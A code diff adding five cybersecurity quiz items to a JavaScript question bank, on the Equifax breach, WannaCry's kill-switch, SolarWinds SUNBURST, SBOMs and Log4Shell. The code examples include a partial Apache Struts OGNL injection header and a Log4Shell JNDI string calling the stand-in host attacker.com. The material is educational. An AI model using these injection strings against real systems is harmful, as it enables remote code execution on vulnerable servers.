@@ -239,6 +239,46 @@ while (digital_society.exists()) {
     defend_with_unyielding_integrity();
     protect_human_welfare();
 }`
+  },
+  {
+    question: "What technical lessons were learned from the 2017 Equifax data breach?",
+    shortAnswer: "A critical Apache Struts vulnerability (CVE-2017-5638) remained unpatched for over two months due to flawed vulnerability management, allowing attackers to steal 147 million records.",
+    explanation: "The breach highlighted the vital necessity of software inventory assets, automated patch deployment, and network segmentation to prevent lateral movement from web apps to core databases.",
+    hint: "Unpatched Apache Struts parser flaw leading to 147 million exposed credit files.",
+    level: "moderate",
+    codeExample: "# Apache Struts OGNL injection header:\nContent-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}"
+  },
+  {
+    question: "How did ethical white hat researcher Marcus Hutchins stop the 2017 global WannaCry ransomware epidemic?",
+    shortAnswer: "By reverse-engineering the malware binary, discovering an unregistered hardcoded domain kill-switch, and registering that domain for $10.69, which caused WannaCry to deactivate itself.",
+    explanation: "The ransomware tested an HTTP connection to the unregistered domain before encrypting; if the domain was active and responded, WannaCry exited to avoid running in security analysis sandboxes.",
+    hint: "Reverse-engineering the binary and registering an unregistered kill-switch web domain.",
+    level: "moderate",
+    codeExample: "if (InternetOpenUrlA(hSession, 'http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com', ...)) exit(0);"
+  },
+  {
+    question: "What was the significance of the 2020 SolarWinds cyber attack in terms of software supply chain security?",
+    shortAnswer: "Adversaries injected malicious code (SUNBURST) directly into SolarWinds Orion source builds during compilation, compromising thousands of government agencies and Fortune 500 networks via signed, trusted updates.",
+    explanation: "SolarWinds demonstrated that perimeter defenses and digital code-signing signatures cannot protect against compromised build pipelines, giving rise to Software Bills of Materials (SBOMs).",
+    hint: "Tainted software update containing malicious backdoor delivered to 18,000 customers.",
+    level: "advanced",
+    codeExample: "// SUNBURST backdoor stealth execution delay:\nThread.Sleep(new Random().Next(288, 336) * 3600 * 1000); // 12-14 days sleep"
+  },
+  {
+    question: "What is an SBOM (Software Bill of Materials) and how does it prevent supply chain vulnerabilities like Log4Shell?",
+    shortAnswer: "An SBOM is a formal, machine-readable inventory of all software components, third-party libraries, and dependencies included within an application build.",
+    explanation: "When Log4Shell (CVE-2021-44228) hit, organizations with an SBOM instantly identified every application utilizing the vulnerable `log4j-core` library within minutes instead of weeks of manual code audits.",
+    hint: "Comprehensive component and library inventory tracking all software dependencies.",
+    level: "advanced",
+    codeExample: "cyclonedx-cli merge --input-files sbom-frontend.json sbom-backend.json --output-file final-sbom.json"
+  },
+  {
+    question: "What role did ethical hackers play in uncovering and mitigating the Log4Shell (CVE-2021-44228) vulnerability?",
+    shortAnswer: "Alibaba Cloud security researchers discovered the JNDI lookup injection flaw in Apache Log4j, responsibly alerted Apache, and published detection scripts and WAF regex rules globally.",
+    explanation: "Log4Shell allowed unauthenticated remote code execution via `${jndi:ldap://...}` headers. Ethical security researchers worked around the clock to create hot-patches (e.g. Log4jHotPatch) before mass automated exploitation.",
+    hint: "JNDI lookup injection flaw responsibly reported by security researchers.",
+    level: "advanced",
+    codeExample: "${jndi:ldap://attacker.com/a} # Log4Shell JNDI injection string"
   }
 ];
 
